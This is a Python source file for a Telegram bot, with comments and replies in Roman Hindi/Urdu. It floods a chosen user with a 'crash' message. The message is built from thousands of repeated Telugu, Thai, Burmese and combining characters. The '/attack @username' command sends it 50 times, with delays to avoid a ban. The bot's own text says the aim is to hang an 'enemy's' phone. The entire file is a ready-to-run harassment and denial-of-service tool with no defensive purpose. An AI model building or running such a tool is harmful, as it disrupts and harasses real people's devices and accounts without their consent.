from telethon import TelegramClient, events, Button
import asyncio
import os

# --- DETAILS (Ye Render par set karenge) ---
API_ID = int(os.environ.get("API_ID", 12345))
API_HASH = os.environ.get("API_HASH", "yahan_hash_ayegi")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "yahan_token_ayega")
# ------------------------------------------

client = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Sabse Khatarnak Virus Code (Heavy RAM Eater)
ULTRA_VIRUS = (
    "☣️ **DS5 SYSTEM CRASH** ☣️\n" + 
    "జ్ఞా" * 2000 +  # Heavy Telugu Character
    "ด็็็็็็็็็็็" * 1500 + # Thai Lag Code
    " ҉ " * 1000 + # Glitch Symbol
    " ٜ " * 1000 + # Invisible Lag
    "ဪ" * 1000   # Burmese Crash Code
)

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond(
        "🔥 **DS5 OMEGA BUG BOT v2.0** 🔥\n\n"
        "Welcome! Yeh bot dushman ki device hang karne ke liye banaya gaya hai. 🦠\n\n"
        "**COMMAND:** `/attack @username`",
        buttons=[
            [Button.inline("🚀 START ATTACK", "attack_info")],
            [Button.url("📢 Join Channel", "https://t.me/your_channel")] # Apna channel link dalo
        ]
    )

@client.on(events.CallbackQuery(data="attack_info"))
async def info(event):
    await event.edit("⚡ **READY!**\n\nLikho: `/attack` aur aage target ka username.\nExample: `/attack @dushman`")

@client.on(events.NewMessage(pattern='/attack'))
async def attack(event):
    args = event.text.split()
    if len(args) < 2:
        await event.respond("⚠️ **Error:** Target ka username toh dalo!")
        return
    
    target = args[1]
    await event.respond(f"🛰 **Infecting:** {target}\n🔥 **Status:** Virus packets bhej raha hoon...")

    try:
        # Loop ko 50 baar chalayenge taake device sambhal na paye
        for i in range(50):
            await client.send_message(target, ULTRA_VIRUS)
            await asyncio.sleep(0.3) # Bot ban hone se bachane ke liye thora gap
        
        await event.respond(f"✅ **Mission Done!**\n{target} ka phone ab makkhan ki tarah hang ho raha hoga. 🤣")
    except Exception as e:
        await event.respond("❌ **Failed:** Target ne ya toh bot block kiya hai ya username ghalat hai.")

print("Virus Bot is Online...")
client.run_until_disconnected()
